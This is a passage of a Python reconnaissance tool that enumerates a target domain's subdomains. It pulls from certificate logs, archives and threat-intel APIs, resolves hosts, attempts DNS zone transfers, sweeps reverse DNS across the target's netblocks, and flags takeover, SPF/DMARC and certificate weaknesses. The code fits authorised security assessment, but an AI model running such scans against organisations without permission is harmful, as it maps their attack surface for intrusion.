    "\n" + "=" * 70


def interactive_launch(a):
    """console mode (--cli / piped stdin): ask for target, pick a profile, go."""
    tty = sys.stdin.isatty()
    statefile = a.state or (os.path.splitext(a.out)[0] + ".state.json")

    if a.resume and os.path.exists(statefile):
        try:
            with open(statefile, encoding="utf-8") as fh:
                st = json.load(fh)
            if st.get("targets"):
                a.targets = st["targets"]
                print(f"[*] resume targets from checkpoint: "
                      f"{', '.join(a.targets)}", flush=True)
                return
        except Exception:
            pass

    print(BANNER)
    raw, prof_line = "", ""
    if not tty:
        raw = sys.stdin.readline()
        prof_line = sys.stdin.readline()
        if not raw.strip():
            sys.exit("[!] no target on stdin - usage: "
                     "echo example.com | python subenum.py")
    else:
        print("  target: domain, comma list, URL (https://x/y), @file.txt, "
              "or 'q' to quit")
        while True:
            try:
                raw = input("  target> ")
            except (EOFError, KeyboardInterrupt):
                sys.exit("\n[!] cancelled")
            if raw.strip().lower() in ("q", "quit", "exit", "x"):
                sys.exit("[*] cancelled")
            if normalize_targets(raw):
                break
            print("  ! no valid hostname - try again")
    domains = normalize_targets(raw)
    if not domains:
        sys.exit("[!] no valid targets")

    prof = (prof_line or "").strip().lower()[:1]
    if tty and prof not in ("f", "q", "c", "x"):
        print("  profile: [Enter]=full auto (advanced, all 19 phases)  "
              "q=quick  c=custom  x=exit")
        while prof not in ("f", "q", "c", "x"):
            try:
                prof = input("  profile> ").strip().lower()[:1]
            except (EOFError, KeyboardInterrupt):
                sys.exit("\n[!] cancelled")
            if not prof:
                prof = "f"
            elif prof not in ("f", "q", "c", "x"):
                print("  ! pick q, c, x or Enter for full")
                prof = ""
    if prof == "x":
        sys.exit("[*] cancelled")
    if prof == "q":
        apply_quick(a)
        prof = "quick"
    elif prof == "c":
        apply_custom(a)
        prof = "custom"
    else:
        prof = "full"

    if not a.resume and os.path.exists(statefile):
        st_targets, known = None, False
        try:
            with open(statefile, encoding="utf-8") as fh:
                st = json.load(fh)
            st_targets, known = st.get("targets"), True
        except Exception:
            pass
        if (known and st_targets is not None
                and set(st_targets) == set(domains)) or (not known):
            if tty:
                if ask(f"  checkpoint {statefile} found - resume? [Y/n] ",
                       "y").lower() in ("y", "yes"):
                    a.resume = True
            else:
                a.resume = True
        else:
            print("  [checkpoint] state file is for different targets "
                  "- starting fresh")

    print(f"  targets : {', '.join(domains)}", flush=True)
    print(f"  profile : {prof} - starting...\n", flush=True)
    a.targets = domains


def sev(f):
    try:
        return SEV.get(f[1:f.index("]")], "info")
    except ValueError:
        return "info"


# ---------------- http helpers ----------------
def fetch_throttled(url):
    """one-shot fetches never retry, so waiting out a backoff only burns the
    budget - skip until the host cools down (floor-only pacing still goes)."""
    st = _RATE.get(_rate_key(url))
    return bool(st) and st.get("delay", 0.0) > 0 and st["until"] > time.time()


async def fetch(session, url, timeout=15, sem=None, head=False, headers=None):
    if sem is None:
        sem = HTTP_SEM
    try:
        async with sem:
            if fetch_throttled(url):        # re-check after the queue wait: the
                return None                 # world may have throttled while queued
            method = session.head if head else session.get
            async with method(url, headers={**UA, **(headers or {})},
                              timeout=aiohttp.ClientTimeout(total=timeout),
                              allow_redirects=True, ssl=False) as r:
                if r.status == 200:
                    return await r.text() if not head else ""
    except Exception:
        return None
    return None


async def fetch_blob(session, url, timeout=20, sem=None, limit=600_000):
    try:
        if sem:
            async with sem:
                if fetch_throttled(url):    # queued behind a throttled wave ->
                    return None             # skip instead of sleeping it out
                async with session.get(url, headers=UA,
                                       timeout=aiohttp.ClientTimeout(total=timeout),
                                       ssl=False) as r:
                    if r.status == 200:
                        return await r.content.read(limit)
        else:
            if fetch_throttled(url):
                return None
            async with session.get(url, headers=UA,
                                   timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False) as r:
                if r.status == 200:
                    return await r.content.read(limit)
    except Exception:
        return None
    return None


# ---------------- phase 1: passive ----------------
async def _json_get(session, url, headers=None, timeout=20, sem=None):
    async def go():
        async with session.get(url, headers={**UA, **(headers or {})},
                               timeout=aiohttp.ClientTimeout(total=timeout),
                               ssl=False) as r:
            return (await r.json(content_type=None)) if r.status == 200 else None
    try:
        if sem is None:
            return await go()
        async with sem:
            return await go()
    except Exception:
        return None


async def cc_index(session, sem):
    j = await _json_get(session, "https://index.commoncrawl.org/collinfo.json", sem=sem)
    if isinstance(j, list) and j and isinstance(j[0], dict):
        return j[0].get("id") or None
    return None


async def cc_hosts(session, idx, d, sem):
    txt = await fetch(session, f"https://index.commoncrawl.org/{idx}-index?url=*.{d}"
                               f"&output=json&limit=2000", 45, sem)
    if not txt:
        return None
    out = set()
    for line in txt.splitlines():
        if not line.startswith("{"):
            continue
        try:
            j = json.loads(line)
        except Exception:
            continue
        h = urlsplit(str(j.get("url") or "")).netloc.lower().split(":")[0]
        if h and "." in h:
            out.add(h)
    return out


async def gated_hosts(session, d, sem):
    """key-gated sources (see module docstring for env var names)."""
    out, hit = set(), False
    keys = {"PD_API_KEY": ("https://chaos.projectdiscovery.io/api/v1/dns/subdomain/" + d,
                           {"X-API-Key": os.environ.get("PD_API_KEY", "")}, "subdomains"),
            "ST_API_KEY": ("https://api.securitytrails.com/v1/domain/" + d + "/subdomains",
                           {"APIKEY": os.environ.get("ST_API_KEY", "")}, "subdomains"),
            "VT_API_KEY": ("https://www.virustotal.com/api/v3/domains/" + d
                           + "/subdomains?limit=1000",
                           {"x-apikey": os.environ.get("VT_API_KEY", "")}, "__data__"),
            "SHODAN_KEY": ("https://api.shodan.io/dns/domain/" + d + "?key="
                           + os.environ.get("SHODAN_KEY", ""), None, "subdomains")}
    for env, (url, hdr, field) in keys.items():
        if not os.environ.get(env):
            continue
        j = await _json_get(session, url, headers=hdr, sem=sem)
        hit = True
        if not isinstance(j, dict):
            continue
        if field == "__data__":
            for it in (j.get("data") or []):
                i = str((it or {}).get("id") or "").lower().rstrip(".")
                if i:
                    out.add(i)
        else:
            for lab in (j.get(field) or []):
                lab = str(lab).lower().rstrip(".")
                if lab:
                    out.add(f"{lab}.{d}" if "." not in lab else lab)
    return out if hit else None


async def passive(domains):
    found, jobs, sem = set(), [], asyncio.Semaphore(15)
    gated = [k for k in ("PD_API_KEY", "ST_API_KEY", "VT_API_KEY", "SHODAN_KEY")
             if os.environ.get(k)]
    if gated:
        print(f"      key-gated sources: {', '.join(gated)}", flush=True)
    async with xsession() as s:
        idx = await cc_index(s, sem)
        if idx:
            print(f"      common crawl index: {idx}", flush=True)
        for d in domains:
            jobs += [
                fetch(s, f"https://crt.sh/?q=%25.{d}&output=json", 25, sem),
                fetch(s, f"https://api.hackertarget.com/hostsearch/?q={d}", 15, sem),
                fetch(s, f"https://api.subdomain.center/?domain={d}", 15, sem),
                fetch(s, f"https://api.certspotter.com/v1/issuances?domain={d}"
                         f"&include_subdomains=true&expand=dns_names", 15, sem),
                fetch(s, f"https://urlscan.io/api/v1/search/?q=domain:{d}&size=100", 15, sem),
                fetch(s, f"https://web.archive.org/cdx/search/cdx?url={d}&matchType=domain"
                         f"&fl=original&collapse=urlkey&limit=5000", 20, sem),
                fetch(s, f"https://otx.alienvault.com/api/v1/indicators/domain/{d}/passive_dns"
                         f"?limit=5000", 20, sem),
                fetch(s, f"https://api.mnemonic.no/pdns/v3/{d}?limit=5000", 20, sem),
                fetch(s, f"https://rapiddns.io/subdomain/{d}?full=1", 25, sem),
                fetch(s, f"https://jldc.me/anubis/subdomains/{d}", 15, sem),
                fetch(s, f"https://api.threatminer.org/v2/domain.php?q={d}&rt=5",
                      15, sem),
                fetch(s, f"https://dns.bufferover.run/q=.domain{d}", 15, sem),
                cc_hosts(s, idx, d, sem) if idx else None,
                gated_hosts(s, d, sem),
            ]
        results = await asyncio.gather(*[j for j in jobs if j],
                                       return_exceptions=True)
    for text in results:
        # one failing source API must not kill the whole passive pass
        if not text or isinstance(text, BaseException):
            continue
        if isinstance(text, (set, frozenset, list)):
            for h in text:
                h = str(h).lower().lstrip("*.").rstrip(".")
                if "." not in h or len(h) > 253:
                    continue
                if any(h == d or h.endswith("." + d) for d in domains):
                    found.add(h)
            continue
        for h in HOST_RE.findall(text.lower()):
            if any(h == d or h.endswith("." + d) for d in domains):
                found.add(h)
    return found


# ---------------- phase 2/3: DNS ----------------
def _probe_ns(candidates):
    """quick liveness probe per nameserver: a dead forwarder (broken router
    NAT, etc.) would otherwise eat the whole dnspython timeout on every
    rotation and stall/kill the system lane. returns responsive servers
    fastest-first (dnspython queries nameservers[0] first)."""
    alive = []
    for ns in candidates:
        t0 = time.perf_counter()
        try:
            pr = dns.resolver.Resolver(configure=False)
            pr.nameservers = [ns]
            pr.lifetime = 2.5
            pr.timeout = 1.5
            pr.resolve("www.example.com", "A")
            alive.append((time.perf_counter() - t0, ns))
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            alive.append((time.perf_counter() - t0, ns))   # responded = working
        except Exception as e:
            if os.environ.get("SUBENUM_DEBUG_NS"):
                print(f"  [probe] {ns} dead: {type(e).__name__}: {e}", flush=True)
            pass                         # timeout / SERVFAIL / unreachable
    alive.sort()
    return [ns for _, ns in alive]


def setup_resolver(mode, nameservers=""):
    global SYS_RES, RESOLVER_MODE
    RESOLVER_MODE = mode if mode in ("auto", "doh", "system") else "auto"
    SYS_RES = None
    if not HAVE_DNSPY:
        if RESOLVER_MODE == "system":
            print("  [dns] dnspython not installed -> using DoH", flush=True)
            RESOLVER_MODE = "auto"
        return
    r = dns.asyncresolver.Resolver()
    if nameservers:
        r.nameservers = [x.strip() for x in re.split(r"[,\s]+", nameservers) if x.strip()]
    else:
        ns = _system_resolvers()
        alive = _probe_ns(ns) if ns else []
        if ns and len(alive) < len(ns):
            print(f"  [dns] dropped {len(ns)-len(alive)} dead nameserver(s), "
                  f"system lane: {alive or 'disabled (DoH only)'}", flush=True)
        r.nameservers = alive            # empty -> sys_q fails fast -> DoH
    r.lifetime = 6.0
    r.timeout = 2.5
    SYS_RES = r


def set_concurrency(dns=0, http=0, port=0):
    """override the DNS/HTTP/port semaphores (0 = keep default)."""
    global DNS_SEM, HTTP_SEM, PORT_SEM
    if dns > 0:
        DNS_SEM = asyncio.Semaphore(dns)
    if http > 0:
        HTTP_SEM = asyncio.Semaphore(http)
    if port > 0:
        PORT_SEM = asyncio.Semaphore(port)


def _fmt_rdata(rd, rtype):
    try:
        if rtype == "A":
            return rd.address
        if rtype == "MX":
            return f"{rd.preference} {rd.exchange}"
        if rtype == "TXT":
            return " ".join(s.decode("utf-8", "ignore") if isinstance(s, bytes) else str(s)
                            for s in rd.strings)
        if rtype == "SRV":
            return f"{rd.priority} {rd.weight} {rd.port} {rd.target}"
        return str(getattr(rd, "target", rd))
    except Exception:
        return str(rd)


async def sys_q(host, rtype="A"):
    """system resolver via dnspython: None = failed, [] = NXDOMAIN, [...] = answers."""
    if SYS_RES is None or not SYS_RES.nameservers:
        return None
    try:
        async with SYS_SEM:
            ans = await SYS_RES.resolve(host, rtype, raise_on_no_answer=False, lifetime=6)
    except Exception as e:
        if HAVE_DNSPY and isinstance(e, dns.resolver.NXDOMAIN):
            return []
        return None
    try:
        rr = ans.rrset
    except Exception:
        return None
    if rr is None:
        return []
    return [(DTYPE.get(rtype, 0), _fmt_rdata(x, rtype)) for x in rr]


async def doh(session, host, rtype="A", i=0, sys_first=False):
    """sys_first=True (bulk passes): local resolver first (fast lane, no TLS),
    DoH only as fallback. The verify pass stays DoH-first, so local-resolver
    lies (NXDOMAIN hijacks, parked IPs) are filtered there."""
    r = None
    if RESOLVER_MODE == "system" or (sys_first and RESOLVER_MODE == "auto"):
        r = await sys_q(host, rtype)
        if r is None:
            r = await _doh_http(session, host, rtype, i)
    else:
        r = await _doh_http(session, host, rtype, i)
        if r is None and RESOLVER_MODE == "auto":
            r = await sys_q(host, rtype)
    if r is None:
        FAILS[0] += 1               # net-error = truly unresolved after all paths
    return r


def _doh_pressure(ei, secs):
    if secs > 0:
        DOH_PRESSURE[ei] = max(DOH_PRESSURE[ei], time.time() + secs)


async def _doh_http(session, host, rtype="A", i=0):
    """DoH query with a per-endpoint slot (cheap routers drop bursts of new TLS
    connections to one destination) + endpoint cooldown after 429/servfail/timeout.
    returns [] for NXDOMAIN/NODATA, None on failure."""
    for attempt in range(3):
        ei = (i + attempt) % len(DOH)
        url = DOH[ei].format(h=host, t=rtype)
        wait = DOH_PRESSURE[ei] - time.time()
        if wait > 0:
            await asyncio.sleep(min(wait, 2.5))
        try:
            async with DNS_SEM:
                async with DOH_SLOTS[ei]:
                    async with session.get(url, headers={**UA, "Accept": "application/dns-json"},
                                           timeout=aiohttp.ClientTimeout(total=6)) as r:
                        if r.status == 200:
                            j = await r.json(content_type=None)
                            if j.get("Status", 0) in (0, 3):   # NOERROR / NXDOMAIN
                                DOH_PRESSURE[ei] = 0.0
                                return [(a.get("type"), a.get("data", ""))
                                        for a in j.get("Answer", [])]
                            _doh_pressure(ei, 0.6)             # SERVFAIL / REFUSED / ...
                        elif r.status == 429:
                            _doh_pressure(ei, 1.0 * (attempt + 1))
                        else:
                            _doh_pressure(ei, 0.3)
        except Exception:
            _doh_pressure(ei, 0.5 * (attempt + 1))
        await asyncio.sleep(0.15 + 0.1 * attempt)
    return None                                       # None = lookup failed (vs [] = NXDOMAIN)


def _dns_connector(**kw):
    """connector for DoH-carrying sessions: limit_per_host caps simultaneous TLS
    handshakes per resolver endpoint (many consumer routers drop such bursts)."""
    return aiohttp.TCPConnector(limit=0, ttl_dns_cache=600,
                                limit_per_host=DNS_PER_HOST, **kw)


async def resolve(session, host, i=0, sys_first=False):
    ans = await doh(session, host, "A", i, sys_first=sys_first)
    if ans is None:
        return host, [], False
    return host, [d for t, d in ans if t == 1], True


async def resolve_all(hosts, label, failed=None, sys_first=False):
    hosts = sorted(set(hosts))
    if not hosts:
        return {}
    live, done, f0, t0 = {}, 0, FAILS[0], time.time()
    conn = _dns_connector(enable_cleanup_closed=True)
    async with plain_session(conn) as s:
        # bulk sets split across the two independent network paths
        # (ISP-UDP ~60 q/s + DoH ~37 q/s) instead of one lane: 60/40 by
        # index, each lane stays inside its safe concurrency.
        # bounded fan-out: materialize at most CHUNK * len(hosts_slice)
        # coroutines at a time (a 60k-host set would otherwise hold 60k
        # coroutine objects before the first resolve runs).
        CHUNK = 2048
        for i in range(0, len(hosts), CHUNK):
            tasks = [resolve(s, h, j, sys_first and (j % 5 < 3))
                     for j, h in enumerate(hosts[i:i + CHUNK], start=i)]
            for coro in asyncio.as_completed(tasks):
                h, ips, ok = await coro
                done += 1
                if ips:
                    live[h] = ips
                elif not ok and failed is not None:
                    failed.add(h)               # transient failure -> caller may retry
                if done % 5000 == 0:
                    print(f"  [{label}] {done}/{len(hosts)} done, {len(live)} live, "
                          f"{FAILS[0]-f0} net-errors", flush=True)
    el = max(time.time() - t0, 1e-6)
    print(f"  [{label}] {len(hosts)} checked -> {len(live)} live, "
          f"{FAILS[0]-f0} net-errors ({el:.1f}s, {len(hosts)/el:.0f} q/s)",
          flush=True)
    return live


def mutate_labels(hosts, domains, cap=20000):
    """aggressive: dev-api., api-v2., api01. style permutations of discovered labels."""
    labels = sorted({h.split(".")[0] for h in hosts if h.split(".")[0]})[:400]
    muts = set()
    for lab in labels:
        if len(lab) > 40:
            continue
        for p in MUT_PFX:
            muts.add(f"{p}-{lab}")
            muts.add(f"{lab}-{p}")
        for x in MUT_SFX:
            muts.add(f"{lab}{x}")
            muts.add(f"{lab}-{x}")
    out = set()
    for m in muts:
        for d in domains:
            out.add(f"{m}.{d}")
            if len(out) >= cap:
                return out
    return out


async def cname_chain(session, host, i=0):
    chain, cur = [], host
    for _ in range(6):
        a = await doh(session, cur, "CNAME", i)
        if not a:
            break
        nxt = [d.rstrip(".") for t, d in a if t == 5]
        if not nxt:
            break
        cur = nxt[0]
        chain.append(cur)
        if cur == host or cur in chain[:-1]:
            break
    return chain


async def dns_records(domains, live, findings):
    cname, apex, chains, dangling = {}, {}, {}, {}
    conn = _dns_connector()
    async with plain_session(conn) as s:
        results = await asyncio.gather(*[cname_chain(s, h, i)
                                          for i, h in enumerate(sorted(live))])
        for h, ch in zip(sorted(live), results):
            if not ch:
                continue
            chains[h] = ch
            cname[h] = ch[0]
            if any(p in ch[-1] for p in CNAME_TAKEOVER):
                findings.append(f"[TAKEOVER-RISK-CNAME] {h} -> {ch[-1]}")
        lasts = sorted({ch[-1] for ch in chains.values()})
        if lasts:
            res = await asyncio.gather(*[doh(s, t, "A", i) for i, t in enumerate(lasts)])
            for t, a in zip(lasts, res):
                if a is None:
                    continue        # lookup failed: not evidence either way
                # an answer carrying only CNAME records (no type-1 A) means
                # the target does not resolve - `a == []` missed this
                if not any(str(x[0]) == "1" for x in a):
                    for h, ch in chains.items():
                        if ch[-1] == t:
                            dangling[h] = t
        for d in domains:
            rec = {}
            for rt in ("NS", "MX", "TXT"):
                a = await doh(s, d, rt, 0)
                rec[rt] = [x[1].strip('"') for x in a] if a else []
            a = await doh(s, d, "A", 0)
            rec["A"] = [x[1] for x in a] if a else []
            dmarc = await doh(s, "_dmarc." + d, "TXT", 1)
            rec["DMARC"] = [x[1].strip('"') for x in dmarc] if dmarc else []
            srv = await asyncio.gather(*[doh(s, f"{svc}.{d}", "SRV", 0) for svc in SRV_QRY])
            rec["SRV"] = [x[1] for a in srv if a for x in a]
            apex[d] = rec
            spfs = [t for t in rec["TXT"] if "spf" in t.lower()]
            if not spfs:
                findings.append(f"[SPF-MISSING] no SPF record on {d}")
            elif any(tok in ("all", "+all")
                     for s in spfs for tok in s.split()):
                findings.append(
                    f"[SPF-OPEN] {d} SPF record ends with `+all` - any sender "
                    f"is authorised to mail as @{d}")
            if not rec["DMARC"]:
                findings.append(f"[DMARC-MISSING] no _dmarc.{d}")
            else:
                if any(re.search(r"(^|;)\s*p\s*=\s*none\b", t, re.I)
                       for t in rec["DMARC"]):
                    findings.append(
                        f"[DMARC-WEAK] {d} DMARC policy is p=none - reports only, "
                        f"no enforcement against spoofing")
                if not any(re.search(r"(^|;)\s*ru[af]\s*=", t, re.I)
                           for t in rec["DMARC"]):
                    findings.append(
                        f"[DMARC-NOREPORT] {d} DMARC record has no rua=/ruf= - "
                        f"spoofing attempts against the domain reach no "
                        f"aggregate or forensic report mailbox")
    return cname, apex, chains, dangling


def record_subdomains(apex, domains):
    """hostnames hidden in apex NS/MX/TXT/DMARC/SRV answers -> new candidates."""
    out = set()
    for d, rec in (apex or {}).items():
        blob = " ".join(str(x) for k in ("NS", "MX", "TXT", "DMARC", "SRV")
                        for x in (rec.get(k) or [])).lower()
        for h in HOST_RE.findall(blob):
            if any(h == z or h.endswith("." + z) for z in domains):
                out.add(h)
    return out


def _xfr_names(where, zone, timeout=8):
    """one AXFR attempt against an authoritative server (blocking, run in thread)."""
    names = set()
    try:
        for msg in dns.query.xfr(where, zone, timeout=timeout, lifetime=timeout,
                                 relativize=False):
            for rrset in msg.answer:
                n = rrset.name.to_text().rstrip(".").lower()
                if n and "." in n:
                    names.add(n)
    except Exception:
        pass
    return names


async def axfr_check(domains, apex, findings, enabled=True):
    """zone-transfer attempt against each apex NS; returns any names dumped."""
    hosts = set()
    if not enabled or not HAVE_DNSPY:
        return hosts
    pairs, seen = [], set()
    for d in domains:
        for ns in (apex.get(d, {}).get("NS") or []):
            ns = str(ns).strip('"').rstrip(".").lower()
            if ns and (d, ns) not in seen:
                seen.add((d, ns))
                pairs.append((d, ns))
    if not pairs:
        return hosts
    ns_ip = {}
    conn = _dns_connector()
    async with plain_session(conn) as s:
        res = await asyncio.gather(*[resolve(s, ns, i) for i, (_, ns) in enumerate(pairs)])
        for (_, ns), (_, ips, _ok) in zip(pairs, res):
            if ips:
                ns_ip[ns] = ips[0]
    sem = asyncio.Semaphore(6)

    async def one(d, ns):
        ip = ns_ip.get(ns)
        if not ip:
            return
        async with sem:
            names = await asyncio.to_thread(_xfr_names, ip, d)
        got = sorted(n for n in names if n == d or n.endswith("." + d))
        if got:
            # >=1: a refused transfer raises and yields nothing, so any name
            # at all proves the server actually transferred the zone
            findings.append(f"[AXFR] {ns} ({ip}) allows zone transfer of {d} "
                            f"-> {len(got)} names")
            hosts.update(got)
            print(f"      [!] AXFR succeeded: {d} via {ns} -> {len(got)} names",
                  flush=True)

    await asyncio.gather(*[one(d, ns) for d, ns in pairs])
    return hosts


# ---------------- phase 4b: reverse DNS + netblock expansion ----------------
CLOUD_HINTS = ("cloudflare", "fastly", "akamai", "amazon", "aws", "google", "microsoft",
               "azure", "digitalocean", "hetzner", "ovh", "linode", "vultr", "alibaba",
               "tencent", "oracle", "edgecast", "leaseweb", "zscaler", "imperva",
               "incapsula", "ddos-guard", "gcore", "selectel", "github", "automattic")


def _public_ip(ip):
    """True for a well-formed globally routable IPv4 address."""
    if not re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", ip):
        return False
    parts = [int(x) for x in ip.split(".")]
    if max(parts) > 255:
        return False
    a, b = parts[0], parts[1]
    if a in (0, 10, 127) or (a == 192 and b == 168) or (a == 169 and b == 254):
        return False
    if a == 172 and 16 <= b <= 31:
        return False
    if a == 100 and 64 <= b <= 127:
        return False
    if a >= 224:                 # multicast (224/4) + reserved (240/4) + bcast
        return False
    return True


def _arpa(ip):
    return ".".join(reversed(ip.split("."))) + ".in-addr.arpa"


def _ptr_names(ans):
    return [str(d).rstrip(".").lower() for t, d in (ans or []) if t == 12]


def _sample_addrs(prefix, n):
    """up to n random host addresses inside an IPv4 CIDR."""
    try:
        net = ipaddress.ip_network(prefix, strict=False)
    except ValueError:
        return []
    if net.version != 4 or n <= 0:
        return []
    size = net.num_addresses
    out, seen = set(), set()
    want = min(n, size)
    while len(out) < want and len(seen) < size:
        off = int.from_bytes(os.urandom(4), "big") % size
        seen.add(off)
        ip = str(net.network_address + off)
        if _public_ip(ip):
            out.add(ip)
    return sorted(out)


async def reverse_expand(live, domains, budget=4000, max_sweeps=40,
                          asn_expand=True, revip=10, enabled=True,
                          netblocks=None):
    """PTR harvest around live IPs + org netblocks + reverse-IP lookups.

    Steps: (1) reverse-IP lookups on the busiest live IPs -> vhost names,
    (2) PTR on every public live IP, (3) full /24 sweeps densest-first,
    (4) RIPEstat covering prefixes of live IPs + announced prefixes of
    non-cloud org ASNs -> sampled PTRs.  `budget` caps PTR queries used by
    steps 3-4; steps 1-2 always run.  Returns in-scope hostnames (unverified).
    When `netblocks` (a set) is given, org-owned IPv4 prefixes (plen 16-24,
    non-cloud ASNs only) are added to it for the phase-18 port sweep.
    """
    if not enabled or not live:
        return set()

    def in_scope(name):
        name = str(name).rstrip(".").lower().strip()
        if "." not in name or " " in name or "*" in name:
            return None
        for d in domains:
            if name == d or name.endswith("." + d):
                return name
        return None

    ips = sorted({ip for v in live.values() for ip in v if _public_ip(ip)})
    if not ips:
        return set()
    blocks = Counter(".".join(ip.split(".")[:3]) for ip in ips)
    found, q = set(), [0]
    remaining = max(0, budget)

    async def ptr_many(s, todo):
        if not todo:
            return
        q[0] += len(todo)
        res = await asyncio.gather(*[doh(s, _arpa(ip), "PTR", i, i % 5 < 3)
                                      for i, ip in enumerate(todo)])
        for ans in res:
            for n in _ptr_names(ans):
                g = in_scope(n)
                if g:
                    found.add(g)

    conn = _dns_connector()
    async with plain_session(conn) as s:
        # 1. reverse-IP lookups (vhost names riding on the same boxes)
        if revip > 0:
            rsem = asyncio.Semaphore(2)
            for ip, _ in blocks.most_common(revip):
                txt = await fetch(s, f"https://api.hackertarget.com/reverseiplookup/?q={ip}",
                                  12, rsem)
                if not txt:
                    continue
                head = txt[:80].lower()
                if "error" in head or "exceeded" in head or "invalid" in head:
                    continue
                for line in txt.splitlines():
                    g = in_scope(line.split(",")[0])
                    if g:
                        found.add(g)

        # 2. PTR on every public live IP
        await ptr_many(s, ips[:2500])

        # 3. /24 sweeps (densest = most live hosts first), budget-bounded;
        #    reserve ~1/3 (max 1200) for netblock sampling when ASN is on
        reserve = min(1200, remaining // 3) if asn_expand else 0
        sweep_cap = remaining - reserve
        for b24, _cnt in blocks.most_common(max_sweeps):
            if sweep_cap <= 0:
                break
            todo = [f"{b24}.{n}" for n in range(1, 255)][:sweep_cap]
            sweep_cap -= len(todo)
            remaining -= len(todo)
            await ptr_many(s, todo)

        # 4. RIPEstat: covering prefixes + org-ASN announced prefixes
        if asn_expand:
            rsem = asyncio.Semaphore(4)
            asns, cover = {}, {}          # cover: prefix -> owning ASNs
            for ip in ips[:20]:
                j = await _json_get(
                    s, f"https://stat.ripe.net/data/network-info/data.json?resource={ip}",
                    sem=rsem)
                data = (j or {}).get("data") or {}
                pfx = str(data.get("prefix") or "")
                try:
                    plen = ipaddress.ip_network(pfx, strict=False).prefixlen if pfx else 99
                except ValueError:
                    plen = 99
                own = {str(a) for a in (data.get("asns") or [])}
                if 16 <= plen <= 23:
                    cover.setdefault(pfx, set()).update(own)
                for asn in own:
                    asns.setdefault(asn, None)
            # resolve holders first: cloud ASNs contribute no netblocks at all
            cloud = {}
            for asn in list(asns)[:12]:
                ov = await _json_get(
                    s, f"https://stat.ripe.net/data/as-overview/data.json?resource=AS{asn}",
                    sem=rsem)
                holder = str((((ov or {}).get("data") or {}).get("holder")) or "").lower()
                cloud[asn] = any(k in holder for k in CLOUD_HINTS)
            if netblocks is not None:
                for pfx, owners in cover.items():
                    if owners and any(not cloud.get(a, True) for a in owners):
                        netblocks.add(pfx)
            for cidr in sorted(cover)[:8]:
                if remaining <= 32:
                    break
                n = min(48, remaining)
                remaining -= n
                await ptr_many(s, _sample_addrs(cidr, n))
            for asn in list(asns)[:8]:
                if remaining <= 32:
                    break
                if cloud.get(asn, True):
                    continue
                j = await _json_get(
                    s, f"https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS{asn}",
                    sem=rsem)
                prefs = []
                for p in (((j or {}).get("data") or {}).get("prefixes") or []):
                    cidr = str(p.get("prefix") or "")
                    if ":" in cidr:
                        continue
                    try:
                        plen = ipaddress.ip_network(cidr, strict=False).prefixlen
                    except ValueError:
                        continue
                    if 16 <= plen <= 24:
                        prefs.append((plen, cidr))
                prefs.sort(reverse=True)
                if netblocks is not None:
                    for plen, cidr in prefs:
                        netblocks.add(cidr)
                for plen, cidr in prefs[:6]:
                    if remaining <= 32:
                        break
                    if plen == 24 and cidr.rsplit(".", 1)[0] in blocks:
                        continue
                    n = min(32, remaining)
                    remaining -= n
                    await ptr_many(s, _sample_addrs(cidr, n))

    print(f"      reverse: {q[0]} PTR + {min(revip, len(blocks))} reverse-IP queries"
          f" -> {len(found)} in-scope names", flush=True)
    return found


# ---------------- phase 4: TLS ----------------
def _cert_span_days(cert):
    """total validity window (notBefore -> notAfter) in days, or None."""
    try:
        return ((ssl.cert_time_to_seconds(cert["notAfter"]) -
                 ssl.cert_time_to_seconds(cert["notBefore"])) / 86400)
    except Exception:
        return None


async def tls_one(host, findings, sem):
    async with sem:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        try:
            ctx.set_alpn_protocols(["h2", "http/1.1"])   # HTTP/2 fingerprint
        except Exception:
            pass
        try:
            _, w = await asyncio.wait_for(
                asyncio.open_connection(host, 443, ssl=ctx, server_hostname=host), 6)
        except ssl.SSLCertVerificationError as e:
            msg = str(e).replace("\n", " ")[:90]
            tag = "CERT-EXPIRED" if "expired" in msg.lower() else "CERT-INVALID"
            findings.append(f"[{tag}] {host}:443 {msg}")
            # second handshake without verification: SANs are still worth
            # harvesting as subdomain candidates even when the cert is bad
            info = await _tls_insecure(host)
            return host, info
        except Exception:
            return host, None
        alpn = ""
        try:
            ssl_o = w.get_extra_info("ssl_object")
            if ssl_o:
                alpn = ssl_o.selected_alpn_protocol() or ""
        except Exception:
            alpn = ""
        try:
            cert = w.get_extra_info("peercert") or {}
        finally:
            try:
                w.close()
                await asyncio.wait_for(w.wait_closed(), timeout=2)
            except Exception:
                pass
        if not cert:
            return host, None
        subj = {}
        for r in cert.get("subject", ()):
            for k, v in r:
                subj[k] = v
        info = {"issuer": subj.get("organizationName", ""),
                "notAfter": cert.get("notAfter", ""),
                "sans": [v for t, v in cert.get("subjectAltName", ()) if t == "DNS"],
                "alpn": alpn}
        try:
            days = (ssl.cert_time_to_seconds(cert["notAfter"]) - time.time()) / 86400
            if days < 0:
                findings.append(f"[CERT-EXPIRED] {host}:443 expired {abs(days):.0f}d ago")
            elif days < 30:
                findings.append(f"[CERT-EXP-SOON] {host}:443 expires in {days:.0f}d")
            span = _cert_span_days(cert)
            if span and span > 398:
                findings.append(
                    f"[CERT-LONGVALID] {host}:443 certificate is valid "
                    f"{span:.0f} days (>398) - exceeds the CA/B Forum maximum "
                    f"lifetime, stolen keys stay trusted for years")
        except Exception:
            pass
        return host, info


async def _tls_insecure(host, timeout=6):
    """reconnect with verification disabled to read the peer cert (SANs)
    of a host whose certificate failed validation."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False               # must precede verify_mode
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_alpn_protocols(["h2", "http/1.1"])   # HTTP/2 fingerprint
    except Exception:
        pass
    try:
        _, w = await asyncio.wait_for(
            asyncio.open_connection(host, 443, ssl=ctx, server_hostname=host),
            timeout)
    except Exception:
        return None
    ssl_o = None
    try:
        cert = w.get_extra_info("peercert") or {}
        ssl_o = w.get_extra_info("ssl_object")
        alpn = (ssl_o.selected_alpn_protocol() or "") if ssl_o else ""
    finally:
        try:
            w.close()
            await asyncio.wait_for(w.wait_closed(), timeout=2)
        except Exception:
            pass
    if not cert and ssl_o is not None:
        # CERT_NONE: getpeercert() comes back empty - decode the raw chain
        try:
            chain = ssl_o.get_unverified_chain()
            if chain:
                try:
                    pem = ssl.DER_cert_to_PEM_cert(chain[0])
                except TypeError:
